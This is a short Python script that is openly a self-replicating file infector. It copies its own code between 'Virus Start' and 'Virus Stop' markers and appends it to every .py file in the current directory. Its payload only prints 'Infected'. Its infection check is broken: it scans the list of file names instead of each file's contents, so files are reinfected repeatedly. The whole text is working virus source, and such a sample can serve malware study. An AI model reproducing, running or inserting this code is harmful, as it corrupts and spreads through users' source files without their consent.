# Virus Start

import sys, glob, re

vCode = []

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

inVirus = False
for line in lines:
    if(re.search("^# Virus Start", line)):
        inVirus = True

    if inVirus:
        vCode.append(line)

    if (re.search('^# Virus Stop', line)):
        break

# find victim file

vict = glob.glob('*.py')

for p in vict:
    file = open(p, 'r')
    programCode = file.readlines()
    file.close()

    infected = False
    for line in vict:
        if(re.search("^# Virus Stop", line)):
            infected = True
            break

    if not infected:
        newCode = []
        newCode = programCode
        newCode.extend(vCode)
        file = open(p, 'w')
        file.writelines(newCode)
        file.close()

    # payload

    print('Infected')

# Virus Stop
